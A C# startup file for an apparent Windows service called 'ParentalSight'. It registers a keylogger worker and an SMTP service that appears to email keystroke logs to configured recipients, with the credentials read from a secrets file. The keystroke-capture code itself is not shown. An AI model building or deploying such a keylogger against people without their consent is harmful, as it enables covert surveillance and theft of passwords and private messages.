namespace ParentalSight.WindowsService
{
    using Microsoft.Extensions.Configuration;
    using Microsoft.Extensions.DependencyInjection;
    using Microsoft.Extensions.Hosting;
    using Microsoft.Extensions.Logging;
    using ParentalSight.Core;
    using System.Linq;

    internal static class Startup
    {
        public static void BuildServiceConfiguration(this IConfigurationBuilder builder)
        {
            builder.Sources.Clear();
            builder.AddJsonFile("appsettings.json", optional: false);
            builder.AddJsonFile("appsettings.secrets.json", optional: false);
        }

        public static void ConfigureLogging(this ILoggingBuilder builder, HostBuilderContext context)
        {
            // See: https://github.com/dotnet/runtime/issues/47303
            var loggingSettings = context.Configuration.GetSection("Logging");
            builder.AddConfiguration(loggingSettings);
        }

        public static IServiceCollection ConfigureServices(this IServiceCollection services, HostBuilderContext context)
        {
            var config = context.Configuration;
            services.AddHostedService<KeyloggerWorker>();
            services.AddSmtpEmailService(
                   port: config.GetRequiredValue<int>("email:smtp:port"),
                   host: config.GetRequiredValue<string>("email:smtp:host"),
                 sender: config.GetRequiredValue<string>("email:sender"),
               password: config.GetRequiredValue<string>("email:smtp:password"),
               username: config.GetRequiredValue<string>("email:smtp:username"),
             recipients: config.GetSection("email:recipients")?
                               .AsEnumerable()?
                               .Select(x => x.Value)?
                               .ToArray());
            services.AddKeylogger(
                logRotationInMilliseconds: config.GetValue<long>("keylogger:logRotationInMilliseconds"),
                outputPath: config.GetValue<string>("defaultOutputPath"));

            return services;
        }
    }
}
